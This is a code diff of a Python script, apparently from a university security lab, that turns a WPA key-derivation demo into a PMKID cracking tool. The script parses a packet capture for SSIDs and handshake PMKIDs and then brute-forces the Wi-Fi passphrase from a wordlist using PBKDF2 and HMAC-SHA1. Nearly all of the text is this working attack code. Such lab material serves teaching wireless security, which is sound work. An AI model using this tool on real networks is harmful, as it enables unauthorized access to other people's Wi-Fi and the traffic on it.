@@ -1,109 +1,80 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
+# -*- coding: utf-8
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
+Crack PMKID from first 4-way handshake info
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+Dictionary attack on PMKID to crack the passphrase.
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
+__author__      = "Diego Villagrasa, Fabio Marques"
+__copyright__   = "Copyright 2021, HEIG-VD"
 __license__ 	= "GPL"
-__version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
+__version__ 	= "2.0"
+__email__ 		= "diego.villagrasa@heig-vd.ch"
 __status__ 		= "Prototype"
 
 from scapy.all import *
-from binascii import a2b_hex, b2a_hex, hexlify
-from pbkdf2 import PBKDF2
-from numpy import array_split
-from numpy import array
+from binascii import hexlify, a2b_hex
+from pbkdf2 import *
 import hmac, hashlib
 
-def customPRF512(key,A,B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
-    return R[:blen]
+wpa=rdpcap("PMKID_handshake.pcap")
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("PMKID_handshake.pcap") 
+"""
+Dictionary attack to crack the passphrase
+@param pmkid pmkid from 4-way handshake
+@param ssid correspondig ssid
+@param mac_ap mac address of the access point
+@param mac_sta mac address of the station trying to connect to the a
+@returns the passphrase if found or None
+"""
+def get_passphrase(pmkid, ssid, mac_ap, mac_sta):
+    # format data
+    ssid = ssid.encode()
+    mac_ap = a2b_hex(mac_ap.replace(':', ''))
+    mac_sta = a2b_hex(mac_sta.replace(':', ''))
+    pmkid = pmkid.decode('utf-8')
 
-# Important parameters for key derivation - most of them can be obtained from the pcap file
-ssid        = "Sunrise_2.4GHz_DD4B90"
-APmac       = ""
-Clientmac   = ""
-PMKID = ""
+    with open("wordlist.txt") as f:
+        for line in f:
+            passphrase = line.replace('\n', '').encode()
+            # generate pmk with a passphrase from the wordlist
+            pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
+            # generate pmkid related to the actual passphrase
+            pmkid_calc = hmac.new(pmk, b"PMK Name" + mac_ap + mac_sta, hashlib.sha1).hexdigest()[:32]
 
-# Iterate over each packet
+            # if they match it means we got the right passphrase
+            if (pmkid == pmkid_calc):
+                return passphrase
+    return None
+
+ssids = {} # dictionary of all found mac_ap related to their ssid
+found_macs = {} # dictionary of all processed mac_ap
+
 for pkt in wpa:
-    # Check if we have a 802.11 packet and haven't found the WiFi mac yet
-    if pkt.haslayer(Dot11) and APmac == "":
-        try:
-            # Check if the packet contains the right ssid 
-            if pkt.info.decode('ascii') == ssid:
-                #Register the mac of the ap
-                APmac = pkt[Dot11].addr2.replace(":", "")
-                print("Found SSID MAC", APmac)
-        except Exception:
-            pass
-    
-    # Check foe EAPOL packet
+    # check if we can find a ssid
+    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
+        # add the current mac_ap allong with is ssid to our ssids dictionary
+        if pkt.addr2 not in ssids:
+            ssids[pkt.addr2] = pkt.info.decode('ascii')
+
+    # check if is a 4-way handshake
     if pkt.haslayer(EAPOL):
-        src = pkt[Dot11].addr2.replace(":", "")
-        dst = pkt[Dot11].addr1.replace(":", "")
-        to_DS = pkt[Dot11].FCfield & 0x1 !=0
-        from_DS = pkt[Dot11].FCfield & 0x2 !=0
+        # parse needed data
+        mac_ap = pkt[Dot11].addr2
+        mac_sta = pkt[Dot11].addr1
+        pmkid = hexlify(pkt.getlayer(Raw).load)[202:234]
 
-        # If the packet id from DS
-        if from_DS == True and src == APmac:
-            nonce = hexlify(pkt[Raw].load)[26:90]
-            mic = hexlify(pkt[Raw].load)[154:186]
-            
-            # Check for the PMKID
-            pmkid = hexlify(pkt.getlayer(Raw).load)[202:234]
-            if pmkid != '00000000000000000000000000000000' and pmkid != '':
-                Clientmac = dst
-                PMKID = pmkid.decode('utf-8')
-                print("Extracted PMKID", PMKID)
-                break
+        # check if it's a valid pmkid
+        if pmkid != '00000000000000000000000000000000' and pmkid != '':
+            # if we cannot find the mac_ap inside ssids it means we cannot proced
+            # also if mac_ap inside found_macs it means we already tried that mac
+            if mac_ap in ssids and mac_ap not in found_macs:
+                # that way we know we already tried that mac
+                found_macs[mac_ap] = ssids[mac_ap]
+                # bruteforce the passphrase
+                passphrase = get_passphrase(pmkid, ssids[mac_ap], mac_ap, mac_sta)
 
-# Load the wordlist and iterate over it
-with open("wordlist.txt") as f:
-    while(True):
-        passPhrase  = f.readline().replace("\n", "")
-
-        if passPhrase == "":
-            break
-
-        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-        passPhrase = str.encode(passPhrase)
-        
-        pmk = PBKDF2(passPhrase,ssid.encode(), 4096).read(32)
-
-        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-        hashed = hmac.new(pmk, b"PMK Name" + a2b_hex(APmac) + a2b_hex(Clientmac), hashlib.sha1).hexdigest()
-
-        print ("\nResults of the key expansion")
-        print ("=============================")
-        print ("Passphrase: ",passPhrase,"\n")
-        print ("PMK:\t\t", pmk.hex(),"\n")
-        print ("PMKID:\t\t",PMKID,"\n")
-        print ("Calc PMKID:\t",hashed[:32],"\n")
-
-        # Check if the calculated mic is the same as the mic
-        if PMKID == hashed[:32]:
-            print("Found Passphrase: ", passPhrase.decode())
-            exit(0)
-
-print("Could not find passphrase")
+                print("ssid: ", ssids[mac_ap])
+                print("passphrase: ", passphrase)
